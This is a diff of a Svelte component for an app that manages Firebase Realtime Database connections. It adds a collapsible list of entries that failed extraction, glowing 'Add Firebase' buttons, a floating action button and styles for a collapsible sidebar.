@@ -3797,6 +3679,35 @@
                 </div>
               </div>
 
+              <!-- Malformed entries review -->
+              {#if uxMalformed.length}
+                <div class="ux-malformed-section">
+                  <button class="ux-malformed-toggle" onclick={() => uxShowMalformed = !uxShowMalformed}>
+                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                      <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
+                    </svg>
+                    {uxMalformed.length} entry{uxMalformed.length !== 1 ? 'ies' : 'y'} failed extraction
+                    <svg class="ux-malformed-chevron {uxShowMalformed ? 'ux-chevron-open' : ''}" width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                      <polyline points="6 9 12 15 18 9"/>
+                    </svg>
+                  </button>
+                  {#if uxShowMalformed}
+                    <div class="ux-malformed-list">
+                      {#each uxMalformed as m, i}
+                        <div class="ux-malformed-item">
+                          <span class="ux-malformed-idx">{i + 1}</span>
+                          <div class="ux-malformed-body">
+                            <div class="ux-malformed-line" title={m.line}>{m.line}</div>
+                            <div class="ux-malformed-reason">{m.reason}</div>
+                          </div>
+                        </div>
+                      {/each}
+                    </div>
+                  {/if}
+                </div>
+              {/if}
+
               <!-- Footer: Add selected to connections -->
               <div class="ap-foot">
                 <button class="btn btn-ghost" onclick={() => { uxClear(); addPanelMode='single'; }}>Cancel</button>
@@ -3804,7 +3715,7 @@
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5z"/></svg>
                   Send to Bulk
                 </button>
-                <button class="btn btn-primary" onclick={() => { uxAddToBulk(); addPanelMode = 'bulk'; }}>
+                <button class="btn btn-primary" onclick={uxAddConnections}>
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
                   Add {uxResults.filter(r => r.selected).length} Connection{uxResults.filter(r => r.selected).length !== 1 ? 's' : ''}
                 </button>
@@ -4169,7 +4080,7 @@
               <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
               Copy Details
             </button>
-            <button class="fc-act-btn" onclick={() => (addOpen = true)} title="Add Firebase connection">
+            <button class="fc-add-glow-btn" onclick={openAddPanel} title="Add Firebase connection">
               <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
               Add New
             </button>
@@ -4199,8 +4110,8 @@
               <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" opacity="0.25"><path d="M4 7l8-4 8 4v10l-8 4-8-4V7z"/><path d="M4 7l8 4 8-4M12 11v10"/></svg>
               <div class="fc-empty-title">No Firebase connections yet</div>
               <div class="fc-empty-sub">Click "Add New" or use the + button to connect a Firebase RTDB.</div>
-              <button class="btn btn-primary" onclick={() => (addOpen = true)}>
-                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
+              <button class="fc-add-glow-btn fc-add-glow-lg" onclick={openAddPanel}>
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
                 Add Firebase Connection
               </button>
             {:else}
@@ -5576,6 +5487,22 @@
   </div>
 </div>
 
+<!-- Floating Action Button: Add Firebase (Corner FAB) -->
+{#if !addOpen}
+  <button
+    class="corner-add-fab"
+    onclick={openAddPanel}
+    title="Add Firebase Connection (Single / Bulk / File / Extract)"
+    aria-label="Add Firebase Connection"
+  >
+    <span class="corner-add-fab-glow"></span>
+    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M12 5v14M5 12h14" />
+    </svg>
+    <span class="corner-add-fab-text">Add Firebase</span>
+  </button>
+{/if}
+
 <!-- Toasts -->
 <div class="toast-stack">
   {#each toasts as t (t.id)}
@@ -5764,13 +5691,23 @@
   .sidebar.no-transition {
     transition: none !important;
   }
-  .sidebar.desktop-closed {
-    width: 0 !important;
-    min-width: 0 !important;
-    border-right: none;
-    opacity: 0;
-    pointer-events: none;
-    overflow: hidden;
+  /* Desktop-only collapsed sidebar */
+  @media (min-width: 769px) {
+    .sidebar.desktop-closed {
+      width: 0 !important;
+      min-width: 0 !important;
+      border-right: none;
+      pointer-events: none;
+      overflow: visible;
+    }
+    .sidebar.desktop-closed > *:not(.sidebar-edge-chevron) {
+      opacity: 0;
+      pointer-events: none;
+      visibility: hidden;
+    }
+    .sidebar.desktop-closed .sidebar-edge-chevron {
+      pointer-events: auto;
+    }
   }
 
   /* ── Sidebar resize handle (desktop only) ───────────────────────────── */
@@ -5788,6 +5725,125 @@
   .sidebar-resize-handle:hover,
   .sidebar-resize-handle:active {
     background: rgba(249, 115, 22, 0.5);
+  }
+
+  /* ── Sidebar edge chevron toggle ──────────────────────────────────── */
+  .sidebar-edge-chevron {
+    position: absolute;
+    top: 50%;
+    right: -13px;
+    transform: translateY(-50%);
+    z-index: 20;
+    width: 26px;
+    height: 26px;
+    border-radius: 50%;
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    background: #141b2b;
+    color: #94a3b8;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 220ms cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.35);
+    opacity: 0.9;
+    pointer-events: auto;
+  }
+  .sidebar:hover .sidebar-edge-chevron,
+  .sidebar-edge-chevron:hover,
+  .sidebar-edge-chevron:focus-visible {
+    opacity: 1;
+  }
+  .sidebar-edge-chevron:hover {
+    background: #1e293b;
+    color: #f97316;
+    border-color: rgba(249, 115, 22, 0.5);
+    box-shadow: 0 0 14px rgba(249, 115, 22, 0.35), 0 2px 8px rgba(0, 0, 0, 0.4);
+    transform: translateY(-50%) scale(1.1);
+  }
+  .sidebar-edge-chevron:active {
+    transform: translateY(-50%) scale(0.95);
+  }
+  .sidebar-edge-chevron svg {
+    transition: transform 280ms cubic-bezier(0.4, 0, 0.2, 1);
+  }
+  /* When sidebar is open, chevron points left (‹) to collapse */
+  .sidebar:not(.desktop-closed) .sidebar-edge-chevron svg {
+    transform: rotate(0deg);
+  }
+  @media (min-width: 769px) {
+    /* When sidebar is closed, flip the chevron to point right (›) to open */
+    .sidebar.desktop-closed .sidebar-edge-chevron {
+      right: -28px;
+      opacity: 1;
+      background: #161f33;
+      border-color: rgba(249, 115, 22, 0.4);
+      color: #f97316;
+      box-shadow: 0 0 14px rgba(249, 115, 22, 0.3), 0 2px 8px rgba(0, 0, 0, 0.4);
+    }
+    .sidebar.desktop-closed .sidebar-edge-chevron svg {
+      transform: rotate(180deg);
+    }
+  }
+
+  /* ── Sidebar bottom corner action bar ──────────────────────────────────── */
+  .side-bottom-action {
+    padding: 10px 12px;
+    border-top: 1px solid rgba(255, 255, 255, 0.06);
+    background: rgba(14, 20, 32, 0.95);
+    flex-shrink: 0;
+  }
+  .side-bottom-add-btn {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    padding: 8px 12px;
+    border-radius: 9px;
+    background: linear-gradient(135deg, rgba(249, 115, 22, 0.2) 0%, rgba(234, 88, 12, 0.15) 100%);
+    border: 1px solid rgba(249, 115, 22, 0.35);
+    color: #fdba74;
+    font-size: 11.5px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+    transition: all 180ms ease;
+  }
+  .side-bottom-add-btn:hover {
+    background: linear-gradient(135deg, rgba(249, 115, 22, 0.35) 0%, rgba(234, 88, 12, 0.25) 100%);
+    border-color: rgba(249, 115, 22, 0.6);
+    color: #ffffff;
+    box-shadow: 0 0 14px rgba(249, 115, 22, 0.25);
+    transform: translateY(-1px);
+  }
+  .side-bottom-add-btn:active {
+    transform: translateY(0) scale(0.98);
+  }
+
+  /* ── Sidebar panel header collapse button ──────────────────────────────── */
+  .side-collapse-btn {
+    margin-left: auto;
+    background: rgba(255, 255, 255, 0.04);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    cursor: pointer;
+    color: #94a3b8;
+    width: 26px;
+    height: 26px;
+    border-radius: 7px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 150ms ease;
+  }
+  .side-collapse-btn:hover {
+    color: #f97316;
+    background: rgba(249, 115, 22, 0.12);
+    border-color: rgba(249, 115, 22, 0.3);
+    transform: scale(1.05);
+  }
+  .side-collapse-btn:active {
+    transform: scale(0.95);
   }
 
   .side-brand {
@@ -6028,12 +6084,16 @@
     flex-shrink: 0;
   }
   .sf-hdr {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
     font-size: 9px;
     font-weight: 700;
     text-transform: uppercase;
     letter-spacing: 0.1em;
-    color: #334155;
-    margin-bottom: 5px;
+    color: #475569;
+    margin-bottom: 6px;
+    padding: 0 2px;
   }
   .conn-scroll {
     max-height: calc(22px * 10 + 5px); /* 10 rows max */
@@ -7881,16 +7941,36 @@
       max-width: none !important;
       box-shadow: 4px 0 30px rgba(0, 0, 0, 0.6);
       padding-bottom: 0 !important;
+      display: flex !important;
+      flex-direction: column !important;
+      background: #0e1420 !important;
+      overflow: hidden !important;
+      opacity: 1 !important;
+      pointer-events: auto !important;
+      visibility: visible !important;
     }
     .sidebar.desktop-closed {
       width: min(300px, 85vw) !important;
-      opacity: 1;
-      pointer-events: auto;
+      min-width: 0 !important;
+      opacity: 1 !important;
+      pointer-events: auto !important;
+      overflow: hidden !important;
+      border-right: 1px solid rgba(255, 255, 255, 0.07) !important;
+    }
+    .sidebar > *,
+    .sidebar.desktop-closed > *,
+    .sidebar.desktop-closed > *:not(.sidebar-edge-chevron) {
+      opacity: 1 !important;
+      pointer-events: auto !important;
+      visibility: visible !important;
     }
     .sidebar.mob-open {
-      transform: translateX(0);
+      transform: translateX(0) !important;
     }
     .sidebar-resize-handle {
+      display: none;
+    }
+    .sidebar-edge-chevron {
       display: none;
     }
     .side-dev-list {
@@ -10289,24 +10369,114 @@
     background: rgba(255, 255, 255, 0.1);
     border-radius: 3px;
   }
-  /* Inline add-Firebase button in header */
-  .add-fb-inline {
+  /* Glowing add-Firebase button */
+  .add-fb-glow {
     margin-left: auto;
-    background: rgba(249, 115, 22, 0.12);
-    border: 1px solid rgba(249, 115, 22, 0.3);
-    border-radius: 6px;
-    width: 22px;
-    height: 22px;
+    position: relative;
+    background: linear-gradient(135deg, #f97316 0%, #ea580c 50%, #dc2626 100%);
+    border: none;
+    border-radius: 14px;
+    padding: 4px 12px 4px 8px;
     cursor: pointer;
-    color: #f97316;
-    display: flex;
+    color: #fff;
+    display: inline-flex;
     align-items: center;
-    justify-content: center;
-    transition: all 120ms;
+    gap: 5px;
+    font-size: 10.5px;
+    font-weight: 700;
+    font-family: inherit;
+    letter-spacing: 0.03em;
+    transition: all 200ms ease;
     flex-shrink: 0;
+    box-shadow: 0 0 12px rgba(249,115,22,0.35), 0 0 4px rgba(249,115,22,0.2);
+    overflow: hidden;
+    z-index: 1;
   }
-  .add-fb-inline:hover {
-    background: rgba(249, 115, 22, 0.2);
+  .add-fb-glow-ring {
+    position: absolute;
+    inset: -1px;
+    border-radius: 15px;
+    background: linear-gradient(135deg, #fb923c, #f97316, #ea580c, #f97316, #fb923c);
+    background-size: 300% 300%;
+    animation: fb-glow-shift 3s ease infinite;
+    z-index: -1;
+    opacity: 0.7;
+    filter: blur(3px);
+  }
+  @keyframes fb-glow-shift {
+    0%, 100% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+  }
+  .add-fb-glow:hover {
+    transform: scale(1.08);
+    box-shadow: 0 0 20px rgba(249,115,22,0.5), 0 0 8px rgba(249,115,22,0.3);
+  }
+  .add-fb-glow:active {
+    transform: scale(0.97);
+    box-shadow: 0 0 8px rgba(249,115,22,0.25);
+  }
+  .add-fb-glow svg {
+    filter: drop-shadow(0 0 2px rgba(255,255,255,0.4));
+  }
+
+  /* ── Corner Floating Action Button (FAB) ─────────────────────────────────── */
+  .corner-add-fab {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    z-index: 250;
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    padding: 10px 18px 10px 14px;
+    border-radius: 9999px;
+    background: linear-gradient(135deg, #f97316 0%, #ea580c 50%, #dc2626 100%);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    color: #ffffff;
+    font-size: 13px;
+    font-weight: 700;
+    font-family: inherit;
+    letter-spacing: 0.02em;
+    cursor: pointer;
+    box-shadow: 0 6px 20px rgba(249, 115, 22, 0.4), 0 2px 8px rgba(0, 0, 0, 0.4);
+    transition: all 220ms cubic-bezier(0.4, 0, 0.2, 1);
+    backdrop-filter: blur(12px);
+    overflow: hidden;
+  }
+  .corner-add-fab-glow {
+    position: absolute;
+    inset: -2px;
+    border-radius: 9999px;
+    background: linear-gradient(135deg, #fb923c, #f97316, #ea580c, #f97316, #fb923c);
+    background-size: 300% 300%;
+    animation: fb-glow-shift 3s ease infinite;
+    z-index: -1;
+    opacity: 0.8;
+    filter: blur(4px);
+  }
+  .corner-add-fab:hover {
+    transform: translateY(-2px) scale(1.05);
+    box-shadow: 0 8px 28px rgba(249, 115, 22, 0.6), 0 3px 12px rgba(0, 0, 0, 0.5);
+    color: #ffffff;
+  }
+  .corner-add-fab:active {
+    transform: translateY(0) scale(0.97);
+    box-shadow: 0 4px 14px rgba(249, 115, 22, 0.35);
+  }
+  .corner-add-fab svg {
+    filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.3));
+    transition: transform 200ms ease;
+  }
+  .corner-add-fab:hover svg {
+    transform: rotate(90deg);
+  }
+  @media (max-width: 768px) {
+    .corner-add-fab {
+      bottom: 74px; /* float comfortably above mobile bottom nav */
+      right: 16px;
+      padding: 9px 14px 9px 12px;
+      font-size: 12px;
+    }
   }
 
   /* ── Pagination bar ──────────────────────────────────────────────────────── */
@@ -11381,6 +11551,50 @@
   .fc-act-danger { color: #f59e0b !important; border-color: rgba(245,158,11,0.3) !important; }
   .fc-act-danger:hover { background: rgba(245,158,11,0.14) !important; color: #f59e0b !important; border-color: rgba(245,158,11,0.5) !important; }
 
+  /* Glowing Add New button in FC toolbar */
+  .fc-add-glow-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    padding: 5px 12px;
+    font-size: 11.5px;
+    font-weight: 700;
+    border-radius: 8px;
+    border: none;
+    background: linear-gradient(135deg, #f97316 0%, #ea580c 60%, #dc2626 100%);
+    color: #fff;
+    cursor: pointer;
+    font-family: inherit;
+    transition: all 180ms ease;
+    white-space: nowrap;
+    box-shadow: 0 0 10px rgba(249,115,22,0.3), 0 2px 6px rgba(0,0,0,0.3);
+    letter-spacing: 0.02em;
+  }
+  .fc-add-glow-btn:hover {
+    transform: translateY(-1px) scale(1.04);
+    box-shadow: 0 0 18px rgba(249,115,22,0.45), 0 4px 10px rgba(0,0,0,0.3);
+    filter: brightness(1.1);
+  }
+  .fc-add-glow-btn:active {
+    transform: translateY(0) scale(0.98);
+    box-shadow: 0 0 6px rgba(249,115,22,0.2);
+  }
+  .fc-add-glow-btn svg {
+    filter: drop-shadow(0 0 2px rgba(255,255,255,0.3));
+  }
+  .fc-add-glow-lg {
+    padding: 8px 18px;
+    font-size: 12.5px;
+    border-radius: 10px;
+    gap: 7px;
+    box-shadow: 0 0 16px rgba(249,115,22,0.35), 0 3px 10px rgba(0,0,0,0.3);
+    animation: fc-glow-pulse 2.5s ease-in-out infinite;
+  }
+  @keyframes fc-glow-pulse {
+    0%, 100% { box-shadow: 0 0 16px rgba(249,115,22,0.35), 0 3px 10px rgba(0,0,0,0.3); }
+    50% { box-shadow: 0 0 24px rgba(249,115,22,0.55), 0 3px 14px rgba(0,0,0,0.3); }
+  }
+
   /* ── Master toggle ──────────────────────────────────────────────────────── */
   .fc-master-toggle {
     display: inline-flex;
@@ -12042,6 +12256,114 @@
     font-weight: 400 !important;
     max-width: 320px;
     line-height: 1.5;
+  }
+
+  /* Stats bar */
+  .ux-stats-bar {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    padding: 6px 10px;
+    border-radius: 6px;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.06);
+  }
+  .ux-stat-item {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    padding: 0 10px;
+  }
+  .ux-stat-label {
+    font-size: 10px;
+    font-weight: 500;
+    color: #475569;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+  }
+  .ux-stat-value {
+    font-size: 12px;
+    font-weight: 700;
+    color: #94a3b8;
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .ux-stat-success .ux-stat-value { color: #22c55e; }
+  .ux-stat-warn .ux-stat-value { color: #fbbf24; }
+  .ux-stat-error .ux-stat-value { color: #ef4444; }
+  .ux-stat-sep {
+    width: 1px;
+    height: 16px;
+    background: rgba(255,255,255,0.08);
+    flex-shrink: 0;
+  }
+
+  /* Malformed entries */
+  .ux-malformed-section {
+    border: 1px solid rgba(251,191,36,0.15);
+    border-radius: 6px;
+    overflow: hidden;
+    background: rgba(251,191,36,0.04);
+  }
+  .ux-malformed-toggle {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 7px 10px;
+    background: none;
+    border: none;
+    color: #fbbf24;
+    font-size: 10.5px;
+    font-weight: 600;
+    cursor: pointer;
+    font-family: inherit;
+    text-align: left;
+    transition: background 100ms;
+  }
+  .ux-malformed-toggle:hover { background: rgba(251,191,36,0.06); }
+  .ux-malformed-toggle svg { flex-shrink: 0; }
+  .ux-malformed-chevron { transition: transform 180ms ease; margin-left: auto; }
+  .ux-chevron-open { transform: rotate(180deg); }
+  .ux-malformed-list {
+    max-height: 180px;
+    overflow-y: auto;
+    border-top: 1px solid rgba(251,191,36,0.1);
+  }
+  .ux-malformed-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+    padding: 6px 10px;
+    border-bottom: 1px solid rgba(251,191,36,0.06);
+  }
+  .ux-malformed-item:last-child { border-bottom: none; }
+  .ux-malformed-idx {
+    font-size: 9px;
+    font-weight: 700;
+    color: #92400e;
+    background: rgba(251,191,36,0.15);
+    border-radius: 3px;
+    padding: 1px 5px;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+  .ux-malformed-body { flex: 1; min-width: 0; }
+  .ux-malformed-line {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 9.5px;
+    color: #94a3b8;
+    word-break: break-all;
+    line-height: 1.4;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    max-width: 100%;
+  }
+  .ux-malformed-reason {
+    font-size: 9.5px;
+    color: #fbbf24;
+    opacity: 0.8;
+    margin-top: 1px;
   }
 
   /* ── FC responsive ────────────────────────────────────────────────────── */
